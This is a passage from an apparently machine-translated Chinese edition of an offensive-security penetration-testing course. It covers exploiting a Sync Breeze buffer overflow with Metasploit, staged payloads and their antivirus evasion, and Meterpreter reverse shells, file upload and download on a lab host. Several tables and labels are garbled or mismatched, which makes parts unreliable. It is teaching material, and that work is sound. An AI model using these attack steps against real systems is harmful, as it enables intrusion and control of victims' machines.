
| 3 | Sync Breeze Enterprise v10.1.16 |

### 基础选项：

| Name | Current Setting | Description |
|---|---|---|
| Proxies | no | 代理链格式类型为：host[:port],type:hos |
| RHOST | yes | 目标地址 |
| RPORT | 80 | yes | 目标端口 (TCP) |
| SSL | false | no | 为出站连接协商 SSL/TLS |
VHOST no | HTTP 服务器虚拟主机

### Payload 信息 信息：

Space: 500

Avoid: 6 characters

描述：

该模块利用了 Sync Breeze Enterprise v9.4.28、v10.0.28 和 v10.1.56 界面中的栈缓冲区溢出漏洞。该漏洞是由于向内置 Web 服务器发送 HTTP GET 和 POST 请求时对请求的边界检查不当导致的。

## 使用 Kali Linux 2.0 进行渗透测试

| Name | Current Setting | Required | Description |
|---|---|---|---|
| CredSSP | true | yes | 是否请求 CredSSP |
| EarlyUser | false | yes | 是否提供 Early User Authorization Re |
| RHOSTS | | yes | 目标范围或 CIDR 标识符 |
| RPORT | 3389 | yes | 目标端口 (TCP) |
| THREADS | 1 | yes | 并发线程数 |
| TLS | true | | 是否请求 TLS 安全 |
VHOST no | HTTP 服务器虚拟主机

Payload 信息：

Space: 500

Avoid: 6 characters

描述：

该模块利用了 Sync Breeze Enterprise v9.4.28、v10.0.28 和 v10.1.56 界面中的栈缓冲区溢出漏洞。该漏洞是由于向内置 Web 服务器发送 HTTP GET 和 POST 请求时对请求的边界检查不当导致的。

# 使用 Kali Linux 进行渗透测试 2.0

![](img/f99f528ca9845f4c256ce54e882b1345_691_0.png)

+   [*] 在 10.11.0.4:4444 上启动反向 TCP 处理器

[*] 正在自动检测目标...

[*] 目标是 10.0.28

[*] 正在发送请求...

[*] shell 会话已打开 1 (10.11.0.4:4444 -> 10.11.0.22:50195)

Microsoft Windows [版本 10.0.16299.248]

(2017) Microsoft Corporation 保留所有。

```
C:\Windows\system32> whoami
whoami
nt authority\system
```

列出正在执行的利用程序

注意当我们执行利用程序时，Metasploit 会自动创建一个负载监听器（listener），而不再需要 Netcat。执行完成后，将创建一个会话，我们就可以使用反向 shell。

## 2.2.1.1 练习

- 1. 使用现有的 Metasploit 模块利用 SyncBreeze。

## 22.3 Metasploit 负载

到目前为止，我们只利用了 `windows/reverse_tcp`，这是一种简单且独立的反向 shell。Metasploit 包含了除了基本 shell 之外的许多其他类型的负载。让我们现在一些。

## 2.2.3.1 分阶段（Staged）与非分阶段（Non-Staged）负载

在深入研究特定的 shellcode 功能之前，我们必须区分分阶段和非分阶段 shellcode 之间的区别，这从这两种负载的描述中可以看出：

```
windows/reverse_tcp 连接回攻击者并产生命令 shell
windows/reverse_tcp 连接回攻击者，产生 cmd (分阶段的)
```

列表 763 - 分阶段和非分阶段负载的语法

负载之间的区别是细微的。非分阶段负载会随着利用程序完整地发送。相比之下，分阶段负载分两部分发送。第一部分包含一个小型负载，它让受害者连接回攻击者，传输一个包含剩余 shellcode 的较大的次级负载，然后执行它。

在某些情况下，我们更倾向于使用分阶段 shellcode 而不是全分阶段的，如果我们利用的漏洞没有足够的缓冲区来容纳完整负载，那么分阶段负载可能是合适的。由于分阶段负载的第一部分比完整负载小，这些较小的初始负载可以帮助我们应对空间受限的情况。此外，我们需要记住，防病毒软件经常检测到利用程序中嵌入的 shellcode。通过将该代码替换为分阶段负载，我们移除了 shellcode 中很大一部分恶意部分，这可能会增加我们的成功几率。在利用程序执行初始阶段后，剩余的负载将被检索并直接注入到受害者的内存中。

PWK 2.0

Copyright © Offensive Security Ltd. 保留所有。

692

# 使用 Kali Linux 进行渗透测试 2.0

注意在 Metasploit 中，/ " 字符用于标记负载是否是分阶段的，因此 "windows/reverse_tcp" 不是分阶段的，而 "windows/shell/reverse_tcp" 是。

## 22.3.2 Meterpreter 负载

如 Metasploit 网站所述，Meterpreter 是一种可以在运行时动态扩展的多功能负载。通过这种方式，Meterpreter 提供了比普通命令 shell 更多的特性和功能，提供了如文件传输、按键记录和其他与受害者机器交互的方法。这些工具在后渗透阶段特别有用。由于 Meterpreter 的灵活性和能力，它是最受喜和最常用的 Metasploit 负载。

搜索 "meterpreter" 会返回一长串结果，但导航到负载类别，可以发现适用于多个操作系统和架构的 meterpreter，包括 Windows、Linux、Android、Apple iOS、FreeBSD 和 Apple OS X/macOS。

```
msf5 > search meterpreter type:payload
匹配的模块
```

| 名称 | 描述 |
|---|---|
| 1 | payload/android/meterpreter/reverse_http | Android Meterpreter, Android |
| 2 | payload/android/meterpreter/reverse_https | Android Meterpreter, Android |
| 3 | payload/android/meterpreter/reverse_tcp | Android Meterpreter, Android |
| 4 | payload/android/meterpreter/reverse_http | Android Meterpreter, Shell |
| 5 | payload/android/meterpreter/reverse_https | Android Meterpreter, Shell |
| 6 | payload/android/meterpreter/reverse_tcp | Android Meterpreter, Shell |
| 7 | payload/ios/aarch64/meterpreter/reverse_http | Apple_iOS Meterpreter |
| 8 | payload/ios/aarch64/meterpreter/reverse_https | Apple_iOS Meterpreter |
| 9 | payload/ios/aarch64/meterpreter/reverse_tcp | Apple_iOS Meterpreter |
| 10 | payload/ios/arm/meterpreter/reverse_http | Apple_iOS Meterpreter |

列表 764 - Meterpreter 负载

有多个 Meterpreter 版本基于特定的编程语言（Python, PHP, Java）、协议（UDP, HTTPS, IPv6）和其他规范（32 位、分阶段与非分阶段）。例如，反 meterpreter 负载的选择所示：

```
payload/windows/meterpreter/reverse_udp Reverse Stager
payload/windows/meterpreter/reverse_http Windows Stager
payload/windows/meterpreter/reverse_https Windows Stager
payload/windows/meterpreter/reverse_ipv6_tcp Reverse Stager (IPv6)
payload/windows/meterpreter/reverse_tcp Reverse Stager
```

列表 765 - Meterpreter 协议

https://github.com/rapid/metasploit-framework/wiki/Meterpreter

PWK 2.0 © Offensive Security Ltd. 保留所有。

693

OFFENSIVE SECURITY

可以使用 `set` 选择特定的 meterpreter 负载并像标准反向 shell 那样配置它：

```
msf5 exploit(windows/http_handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf5 exploit(windows/http_handler) > set LHOST 10.11.0.4
LHOST => 10.11.0.4
msf5 exploit(windows/http_handler) > show options
```

负载 (windows/meterpreter/reverse_http):

| 名称 | 当前设置 | 需要 | 描述 |
|---|---|---|---|
| EXITFUNC | | | 退出技术 |
| LHOST | 10.11.0.4 | 是 | 监听器主机名 |
| LPORT | 4444 | 是 | 监听端口 |
| LURI | | 否 | HTTP 路径 |

列表 766 - 选择 meterpreter 负载并配置选项

让我们同步尝试此负载。配置好一切后，我们可以启动利用程序并建立反向 meterpreter 连接：

```
msf5 exploit(windows/http_handler) > exploit
[*] 在 http://10.11.0.4:4444 上启动 HTTP 处理器
[*] 正在自动检测目标...
[*] 目标是 10.0.28
[*] 正在发送请求...
[*] http://10.11.0.4:4444 处理来自 10.11.0.22 的请求；UUID: pchowbz) 分阶段
[*] Meterpreter 会话 1 已打开 (10.11.0.4:4444) -> 10.11.0.22:50270
meterpreter >
```

列表 757 - 建立反向 meterpreter 连接

所示所示meterpreter 负载的语法与我们看到的其他负载匹配。让我们进一步研究 Meterpreter 以突出一些显著的差异。

## 22.3.3 实验 Meterpreter

我们可以使用 `help` 命令获取 Meterpreter 内置的所有模块和命令列表：

```
meterpreter > help
```

### 核心命令

| 命令 | 描述 |
| --- | --- |
| ? | 帮助菜单 |
| background | 将当前会话后台化 |
| bgkill | 杀死后台 meterpreter 脚本 |
| bglist | 列出运行的后台脚本 |
| bgrun | 作为后台线程执行 meterpreter 脚本 |
| channel | 显示信息或控制活动通道 |
| close | 关闭通道 |
| disable_unicode_encoding | 禁用 unicode 字符串编码 |
| enable_unicode_encoding | 启用 unicode 字符串编码 |
| exit |  meterpreter 会话 |
| get_timeouts | 获取当前会话超时值 |
| guid | 获取会话 GUID |

列表 768 - Meterpreter 的帮助命令

了解 Meterpreter 特性的最佳方法是测试它们。让我们从 `sysinfo` 和 `getuid` 等几个简单命令开始。

```
meterpreter > sysinfo
Computer : CLIENT251
OS : Windows 10 (Build 16299)
Architecture : x86
System Language : en_US
Domain : corp
Logged On Users : 7
Meterpreter : x86/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

列表 769 - 在 meterpreter 中执行简单命令

引入的命令为我们提供了有关目标计算机、操作系统和当前用户的信息。接下来，让我们使用内置的 meterpreter 命令尝试一些上传。注意，由于 shell 转义，我们对目标路径使用双引号 ""，如下所示：

```
meterpreter > upload /usr/share/windows-resources/binaries/bin.exe ""C:\Users\Offsec""
[*] 正在上传：/usr/share/windows-resources/binaries/bin.exe -> C:\Users\Offsec.exe
[*] 已上传：/usr/share/windows-resources/binaries/bin.exe -> C:\Users\Offsec.exe

meterpreter > download c:\Windows\system32\calc.exe /tmp/calc.exe
[*] 正在下载：c:\Windows\system32\calc.exe -> /tmp/calc.exe
[*] 已下载 25.50 KiB (100.0%) : c:\Windows\system32 -> /tmp/calc.exe
[*] 下载：c:\Windows\system32\calc.exe -> /tmp/calc.exe
meterpreter >
```

列表 770 - 使用 meterpreter 上传和下载文件

Meterpreter 包含了基础文件系统命令，如 `pwd`、`ls` 和 `cd`，用于遍历目标文件系统。每个命令的名称与 Linux 上使用的相同，但通过 Meterpreter 在 Windows 宿主机上运行。从 Meterpreter 产生系统 shell 的最大优势是，如果由于某种原因我们的 shell 无法退出（例如，在 shell 中启动了交互式会话且未退出），我们可以退出 shell 返回 Meterpreter 并在新通道中重新生成，如列表 771 所示。

```
meterpreter > shell
Process 3488 created.
Channel 3 created.

C:\Windows\system32> ftp 127.0.0.1
ftp 127.0.0.1
ftp: connect :Connection refused
^C

Terminate channel 3? [Y/n] y

meterpreter > shell
Process 3504 created.
Channel 4 created.

C:\Windows\system32> exit
exit
meterpreter >
```

> 列表 771 - 在 meterpreter 中使用 shell 命令

虽然可以从 `shell` 命令打开的命令行提示符执行应用程序，但我们也可以使用内置的 meterpreter 命令。例如，`execute` 命令启动应用程序，`ps` 列出所有运行的进程，而 `kill` 则终止指定的进程。

虽然 Metploit 的签名负载（payload）包含许多优秀功能，但它不是唯一的可用负载。还有其他适用于特定情况的负载，例如 `vncinject/reverse_http`，它会创建一个反向 VNC 图形连接；或者 `php/reverse_php`，它是一个完全用 PHP 编写的反向 shell，可用于利用 PHP Web 应用程序。存在更奇特的负载，如 `mainframe/reverse_shell_jcl`，它是针对 Z/OS 主机的反向 shellcode。

## 22.3.3 练习

- 1) 花些时间查看并实验 Metploit 中可用的各种负载。

### 22.3.4 可执行载荷

Metploit Framework 载荷可以导出为各种文件类型和格式，如 ASP、VScript、Jar、Windows DLL 和 EXE 等。

713 https://en.wikipedia.org/wiki/Virtual_Network_Computing

714 https://en.wikipedia.org/wiki/Z/OS

# 使用 Kali Linux 2.0 进行渗透测试
